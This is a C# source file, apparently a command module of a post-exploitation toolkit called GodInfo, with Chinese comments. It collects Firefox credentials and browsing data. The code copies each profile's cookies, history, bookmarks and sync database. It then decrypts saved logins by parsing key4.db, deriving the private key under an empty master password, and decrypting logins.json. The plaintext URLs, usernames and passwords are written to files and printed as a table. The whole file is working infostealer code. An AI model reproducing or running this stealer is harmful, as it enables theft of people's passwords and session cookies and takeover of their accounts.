using System;
using System.Collections.Generic;
using System.IO;
using System.Security.Cryptography;
using System.Text;
using System.Text.RegularExpressions;
using GodInfo.Utils;
using GodInfo.Helper.Crypto;
using GodInfo.Helper.Models;

namespace GodInfo.Commands
{
    public class FirefoxCredCommand : ICommand
    {
        private static string masterPassword = ""; // 默认空密码

        // 定义LoginInfo结构体用于显示密码信息
        public struct LoginInfo
        {
            public string Url;
            public string Username;
            public string Password;
        }

        public void Execute(List<string> args)
        {
            Logger.TaskHeader("Cred Mode", 1);
            Logger.WriteLine("[*] Hunting credentials from Firefox browser.");
            GetFirefoxCred();
        }

        public static void GetFirefoxCred()
        {
            string browserPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
                "Mozilla\\Firefox\\Profiles");
            
            if (!Directory.Exists(browserPath))
            {
                Logger.WriteLine("[-] Firefox browser profile path not found.");
                return;
            }

            Logger.TaskHeader("Hunting Firefox", 1);
            Logger.WriteLine($"[*] FirefoxPath: {browserPath}");

            string firefoxDirectory = Path.Combine(Logger.globalLogDirectory, "Firefox");
            Directory.CreateDirectory(firefoxDirectory);

            foreach (var profileDir in Directory.GetDirectories(browserPath))
            {
                string profileName = new DirectoryInfo(profileDir).Name;
                Logger.TaskHeader($"Firefox ({profileName})", 2);

                // 计数器
                int cookieCount = 0;
                int historyCount = 0;
                int bookmarkCount = 0;
                int passwordCount = 0;

                // 提取并保存 Cookie
                string cookies = ExtractCookies(profileDir, out cookieCount);
                if (!string.IsNullOrEmpty(cookies))
                {
                    Logger.WriteLine($"[*] Hunted {cookieCount} cookies from Firefox ({profileName})");
                    File.WriteAllText(Path.Combine(firefoxDirectory, $"Firefox_{profileName}_cookies.txt"), cookies, Encoding.UTF8);
                }

                // 提取并保存历史记录
                string history = ExtractHistory(profileDir, out historyCount);
                if (!string.IsNullOrEmpty(history))
                {
                    Logger.WriteLine($"[*] Hunted {historyCount} histroys from Firefox ({profileName})");
                    File.WriteAllText(Path.Combine(firefoxDirectory, $"Firefox_{profileName}_history.txt"), history, Encoding.UTF8);
                }

                // 提取并保存书签
                string bookmarks = ExtractBookmarks(profileDir, out bookmarkCount);
                if (!string.IsNullOrEmpty(bookmarks))
                {
                    Logger.WriteLine($"[*] Hunted {bookmarkCount} bookmarks from Firefox ({profileName})");
                    File.WriteAllText(Path.Combine(firefoxDirectory, $"Firefox_{profileName}_bookmarks.txt"), bookmarks, Encoding.UTF8);
                }

                // 提取并保存登录凭证
                List<LoginInfo> loginInfos = new List<LoginInfo>();
                string passwords = ExtractPasswords(profileDir, out passwordCount, loginInfos);
                if (!string.IsNullOrEmpty(passwords))
                {
                    Logger.WriteLine($"[*] Hunted {passwordCount} passwords from Firefox ({profileName})");
                    File.WriteAllText(Path.Combine(firefoxDirectory, $"Firefox_{profileName}_passwords.txt"), passwords, Encoding.UTF8);
                    
                    // 以表格形式显示提取的密码
                    if (loginInfos.Count > 0)
                    {
                        Logger.WriteLine("\n[+] Extracted Passwords:");
                        Logger.PrintTableFromStructs(loginInfos);
                        Logger.WriteLine("");
                    }
                }

                // 复制同步存储数据库
                string syncDbPath = Path.Combine(profileDir, "storage-sync-v2.sqlite");
                if (File.Exists(syncDbPath))
                {
                    try
                    {
                        File.Copy(syncDbPath, Path.Combine(firefoxDirectory, $"Firefox_{profileName}_storage-sync-v2.sqlite"), true);

                        // 复制相关 WAL 和 SHM 文件
                        if (File.Exists(syncDbPath + "-shm"))
                            File.Copy(syncDbPath + "-shm", Path.Combine(firefoxDirectory, $"Firefox_{profileName}_storage-sync-v2.sqlite-shm"), true);
                        if (File.Exists(syncDbPath + "-wal"))
                            File.Copy(syncDbPath + "-wal", Path.Combine(firefoxDirectory, $"Firefox_{profileName}_storage-sync-v2.sqlite-wal"), true);
                    }
                    catch (Exception ex)
                    {
                        Logger.WriteLine($"[-] Error copying storage-sync database: {ex.Message}");
                    }
                }
            }
        }

        private static string ExtractCookies(string profilePath, out int cookieCount)
        {
            cookieCount = 0;
            StringBuilder cookies = new StringBuilder();
            string cookiePath = Path.Combine(profilePath, "cookies.sqlite");
            
            if (!File.Exists(cookiePath))
            {
                return null;
            }

            try
            {
                string tempCookieFile = Path.GetTempFileName();
                File.Copy(cookiePath, tempCookieFile, true);
                
                SQLiteHandler handler = new SQLiteHandler(tempCookieFile);
                if (!handler.ReadTable("moz_cookies"))
                {
                    File.Delete(tempCookieFile);
                    return null;
                }

                cookieCount = handler.GetRowCount();
                for (int i = 0; i < cookieCount; i++)
                {
                    string host = handler.GetValue(i, "host");
                    string name = handler.GetValue(i, "name");
                    string value = handler.GetValue(i, "value");
                    cookies.AppendLine($"[{host}] \t {{{name}}}={{{value}}}");
                }
                
                File.Delete(tempCookieFile);
            }
            catch (Exception ex)
            {
                Logger.WriteLine($"[-] Error extracting cookies: {ex.Message}");
                return null;
            }

            return cookies.ToString();
        }

        private static string ExtractHistory(string profilePath, out int historyCount)
        {
            historyCount = 0;
            StringBuilder history = new StringBuilder();
            string historyPath = Path.Combine(profilePath, "places.sqlite");
            
            if (!File.Exists(historyPath))
            {
                return null;
            }

            try
            {
                string tempHistoryFile = Path.GetTempFileName();
                File.Copy(historyPath, tempHistoryFile, true);
                
                SQLiteHandler handler = new SQLiteHandler(tempHistoryFile);
                if (!handler.ReadTable("moz_places"))
                {
                    File.Delete(tempHistoryFile);
                    return null;
                }

                historyCount = handler.GetRowCount();
                for (int i = 0; i < historyCount; i++)
                {
                    string url = handler.GetValue(i, "url");
                    history.AppendLine(url);
                }
                
                File.Delete(tempHistoryFile);
            }
            catch (Exception ex)
            {
                Logger.WriteLine($"[-] Error extracting history: {ex.Message}");
                return null;
            }

            return history.ToString();
        }

        private static string ExtractBookmarks(string profilePath, out int bookmarkCount)
        {
            bookmarkCount = 0;
            StringBuilder bookmarks = new StringBuilder();
            string bookmarksPath = Path.Combine(profilePath, "places.sqlite");
            
            if (!File.Exists(bookmarksPath))
            {
                return null;
            }

            try
            {
                string tempBookmarksFile = Path.GetTempFileName();
                File.Copy(bookmarksPath, tempBookmarksFile, true);
                
                SQLiteHandler handler = new SQLiteHandler(tempBookmarksFile);
                if (!handler.ReadTable("moz_bookmarks"))
                {
                    File.Delete(tempBookmarksFile);
                    return null;
                }

                List<string> fks = new List<string>();
                for (int i = 0; i < handler.GetRowCount(); i++)
                {
                    var fk = handler.GetValue(i, "fk");
                    if (fk != "0" && !string.IsNullOrEmpty(fk))
                    {
                        fks.Add(fk);
                    }
                }

                handler = new SQLiteHandler(tempBookmarksFile);
                if (!handler.ReadTable("moz_places"))
                {
                    File.Delete(tempBookmarksFile);
                    return null;
                }

                for (int i = 0; i < handler.GetRowCount(); i++)
                {
                    var id = handler.GetRawID(i).ToString();
                    if (fks.Contains(id))
                    {
                        bookmarks.AppendLine(handler.GetValue(i, "url"));
                        bookmarkCount++;
                    }
                }
                
                File.Delete(tempBookmarksFile);
            }
            catch (Exception ex)
            {
                Logger.WriteLine($"[-] Error extracting bookmarks: {ex.Message}");
                return null;
            }

            return bookmarks.ToString();
        }

        private static string ExtractPasswords(string profilePath, out int passwordCount, List<LoginInfo> loginInfos)
        {
            passwordCount = 0;
            StringBuilder passwords = new StringBuilder();
            string loginsJsonPath = Path.Combine(profilePath, "logins.json");
            string keyDbPath = Path.Combine(profilePath, "key4.db");
            
            if (!File.Exists(loginsJsonPath) || !File.Exists(keyDbPath))
            {
                return null;
            }

            try
            {
                string tempKeyDbFile = Path.GetTempFileName();
                File.Copy(keyDbPath, tempKeyDbFile, true);
                
                string tempLoginsJsonFile = Path.GetTempFileName();
                File.Copy(loginsJsonPath, tempLoginsJsonFile, true);
                
                SQLiteHandler handler = new SQLiteHandler(tempKeyDbFile);
                if (!handler.ReadTable("metadata"))
                {
                    File.Delete(tempKeyDbFile);
                    File.Delete(tempLoginsJsonFile);
                    return null;
                }

                byte[] globalSalt = null;
                byte[] item2Byte = null;
                Asn1Der asn = new Asn1Der();
                byte[] privateKey = null;

                for (int i = 0; i < handler.GetRowCount(); i++)
                {
                    if (handler.GetValue(i, "id") != "password") continue;
                    
                    globalSalt = Convert.FromBase64String(handler.GetValue(i, "item1"));
                    try
                    {
                        item2Byte = Convert.FromBase64String(handler.GetValue(i, "item2"));
                    }
                    catch
                    {
                        // 处理可能的格式问题
                        try
                        {
                            item2Byte = Convert.FromBase64String(handler.GetValue(i, "item2)"));
                        }
                        catch (Exception ex)
                        {
                            Logger.WriteLine($"[-] Failed to parse item2 value from key database: {ex.Message}");
                            continue;
                        }
                    }

                    Asn1DerObject item2 = asn.Parse(item2Byte);
                    string asnString = item2.ToString();

                    // 验证密码有效性并尝试获取私钥
                    bool isValidPassword = false;
                    
                    if (asnString.Contains("2A864886F70D010C050103")) // 3DES 加密
                    {
                        try
                        {
                            var entrySalt = item2.objects[0].objects[0].objects[1].objects[0].Data;
                            var cipherText = item2.objects[0].objects[1].Data;
                            
                            DecryptMoz3DES checkPwd = new DecryptMoz3DES(cipherText, globalSalt, Encoding.ASCII.GetBytes(masterPassword), entrySalt);
                            var passwordCheck = checkPwd.Compute();
                            string decryptedPwdChk = Encoding.GetEncoding("ISO-8859-1").GetString(passwordCheck);
                            
                            if (decryptedPwdChk.StartsWith("password-check"))
                            {
                                isValidPassword = true;
                                Logger.WriteLine("[+] Successfully verified master password using 3DES decryption");
                            }
                        }
                        catch (Exception ex)
                        {
                            Logger.WriteLine($"[-] Error during 3DES decryption: {ex.Message}");
                        }
                    }
                    else if (asnString.Contains("2A864886F70D01050D")) // PBE 加密
                    {
                        try 
                        {
                            var entrySalt = item2.objects[0].objects[0].objects[1].objects[0].objects[1].objects[0].Data;
                            var partIV = item2.objects[0].objects[0].objects[1].objects[2].objects[1].Data;
                            var cipherText = item2.objects[0].objects[0].objects[1].objects[3].Data;
                            
                            MozillaPBE CheckPwd = new MozillaPBE(cipherText, globalSalt, Encoding.ASCII.GetBytes(masterPassword), entrySalt, partIV);
                            var passwordCheck = CheckPwd.Compute();
                            string decryptedPwdChk = Encoding.GetEncoding("ISO-8859-1").GetString(passwordCheck);
                            
                            if (decryptedPwdChk.StartsWith("password-check"))
                            {
                                isValidPassword = true;
                                Logger.WriteLine("[+] Successfully verified master password using PBE decryption");
                            }
                        }
                        catch (Exception ex)
                        {
                            Logger.WriteLine($"[-] Error during PBE decryption: {ex.Message}");
                        }
                    }
                    else
                    {
                        Logger.WriteLine("[-] Unknown encryption method in Firefox key database");
                        continue;
                    }

                    if (isValidPassword)
                    {
                        // 检索私钥
                        try
                        {
                            handler = new SQLiteHandler(tempKeyDbFile);
                            if (!handler.ReadTable("nssPrivate"))
                            {
                                Logger.WriteLine("[-] Could not read nssPrivate table");
                                continue;
                            }

                            for (int j = 0; j < handler.GetRowCount(); j++)
                            {
                                var a11Byte = Convert.FromBase64String(handler.GetValue(j, "a11"));
                                Asn1DerObject a11ASNValue = asn.Parse(a11Byte);
                                
                                var keyEntrySalt = a11ASNValue.objects[0].objects[0].objects[1].objects[0].objects[1].objects[0].Data;
                                var keyPartIV = a11ASNValue.objects[0].objects[0].objects[1].objects[2].objects[1].Data;
                                var keyCipherText = a11ASNValue.objects[0].objects[0].objects[1].objects[3].Data;
                                
                                MozillaPBE PrivKey = new MozillaPBE(keyCipherText, globalSalt, Encoding.ASCII.GetBytes(masterPassword), keyEntrySalt, keyPartIV);
                                var fullprivateKey = PrivKey.Compute();
                                
                                privateKey = new byte[24];
                                Array.Copy(fullprivateKey, privateKey, privateKey.Length);
                                
                                Logger.WriteLine("[+] Successfully extracted private key for password decryption");
                                string decryptedLogins = DecryptLogins(loginsJsonPath, privateKey, out passwordCount, loginInfos);
                                passwords.Append(decryptedLogins);
                            }
                        }
                        catch (Exception ex)
                        {
                            Logger.WriteLine($"[-] Error extracting private key: {ex.Message}");
                        }
                    }
                }

                if (privateKey == null)
                {
                    passwords.AppendLine("[-] Failed to extract private key for password decryption");
                    
                    // 添加登录信息的原始数据以供参考
                    passwords.AppendLine("\nRaw logins.json content (encrypted):");
                    passwords.AppendLine("---------------------------------");
                    string loginsData = File.ReadAllText(loginsJsonPath);
                    passwords.AppendLine(loginsData.Substring(0, Math.Min(1000, loginsData.Length)) + "...");
                }

                File.Delete(tempKeyDbFile);
                File.Delete(tempLoginsJsonFile);
            }
            catch (Exception ex)
            {
                Logger.WriteLine($"[-] Error extracting passwords: {ex.Message}");
                return null;
            }

            return passwords.ToString();
        }

        private static string DecryptLogins(string loginsJsonPath, byte[] privateKey, out int loginCount, List<LoginInfo> loginInfos)
        {
            loginCount = 0;
            StringBuilder sb = new StringBuilder();
            Asn1Der asn = new Asn1Der();
            FirefoxLogin[] logins = ParseLoginFile(loginsJsonPath);
            
            if (logins.Length == 0)
            {
                return "No logins found";
            }
            
            foreach (FirefoxLogin login in logins)
            {
                try
                {
                    Asn1DerObject user = asn.Parse(Convert.FromBase64String(login.encryptedUsername));
                    Asn1DerObject pwd = asn.Parse(Convert.FromBase64String(login.encryptedPassword));
                    
                    string hostname = login.hostname;
                    string decryptedUser = TripleDESHelper.DESCBCDecryptor(privateKey, user.objects[0].objects[1].objects[1].Data, user.objects[0].objects[2].Data);
                    string decryptedPwd = TripleDESHelper.DESCBCDecryptor(privateKey, pwd.objects[0].objects[1].objects[1].Data, pwd.objects[0].objects[2].Data);
                    
                    // 清理用户名和密码中的非打印字符
                    string cleanUsername = Regex.Replace(decryptedUser, @"[^\u0020-\u007F]", "");
                    string cleanPassword = Regex.Replace(decryptedPwd, @"[^\u0020-\u007F]", "");
                    
                    sb.AppendLine($"[URL] -> {hostname}");
                    sb.AppendLine($"[USERNAME] -> {cleanUsername}");
                    sb.AppendLine($"[PASSWORD] -> {cleanPassword}");
                    sb.AppendLine();
                    
                    // 添加到LoginInfo列表以便在表格中显示
                    loginInfos.Add(new LoginInfo 
                    {
                        Url = hostname,
                        Username = cleanUsername,
                        Password = cleanPassword
                    });
                    
                    loginCount++;
                }
                catch (Exception ex)
                {
                    sb.AppendLine($"Error decrypting login for {login.hostname}: {ex.Message}");
                }
            }
            
            return sb.ToString();
        }

        private static FirefoxLogin[] ParseLoginFile(string path)
        {
            string rawText = File.ReadAllText(path);
            int openBracketIndex = rawText.IndexOf('[');
            int closeBracketIndex = rawText.IndexOf("],");
            
            if (openBracketIndex == -1 || closeBracketIndex == -1 || closeBracketIndex <= openBracketIndex)
            {
                return new FirefoxLogin[0];
            }
            
            string loginArrayText = rawText.Substring(openBracketIndex + 1, closeBracketIndex - (openBracketIndex + 1));
            return ParseLoginItems(loginArrayText);
        }

        private static FirefoxLogin[] ParseLoginItems(string loginJSON)
        {
            int openBracketIndex = loginJSON.IndexOf('{');
            List<FirefoxLogin> logins = new List<FirefoxLogin>();
            string[] intParams = new string[] { "id", "encType", "timesUsed" };
            string[] longParams = new string[] { "timeCreated", "timeLastUsed", "timePasswordChanged" };
            
            while (openBracketIndex != -1)
            {
                int encTypeIndex = loginJSON.IndexOf("encType", openBracketIndex);
                if (encTypeIndex == -1) break;
                
                int closeBracketIndex = loginJSON.IndexOf('}', encTypeIndex);
                if (closeBracketIndex == -1) break;
                
                FirefoxLogin login = new FirefoxLogin();
                string bracketContent = "";
                
                for (int i = openBracketIndex + 1; i < closeBracketIndex; i++)
                {
                    bracketContent += loginJSON[i];
                }
                
                bracketContent = bracketContent.Replace("\"", "");
                string[] keyValuePairs = bracketContent.Split(',');
                
                foreach (string keyValueStr in keyValuePairs)
                {
                    string[] keyValue = keyValueStr.Split(new[] { ':' }, 2);
                    if (keyValue.Length != 2) continue;
                    
                    string key = keyValue[0];
                    string val = keyValue[1];
                    
                    if (val == "null")
                    {
                        continue;
                    }
                    
                    try
                    {
                        var prop = typeof(FirefoxLogin).GetProperty(key);
                        if (prop == null) continue;
                        
                        if (Array.IndexOf(intParams, key) > -1)
                        {
                            prop.SetValue(login, int.Parse(val), null);
                        }
                        else if (Array.IndexOf(longParams, key) > -1)
                        {
                            prop.SetValue(login, long.Parse(val), null);
                        }
                        else
                        {
                            prop.SetValue(login, val, null);
                        }
                    }
                    catch (Exception ex)
                    {
                        Logger.WriteLine($"[-] Error parsing login JSON: {ex.Message}");
                    }
                }
                
                logins.Add(login);
                openBracketIndex = loginJSON.IndexOf('{', closeBracketIndex);
            }
            
            return logins.ToArray();
        }
    }
} 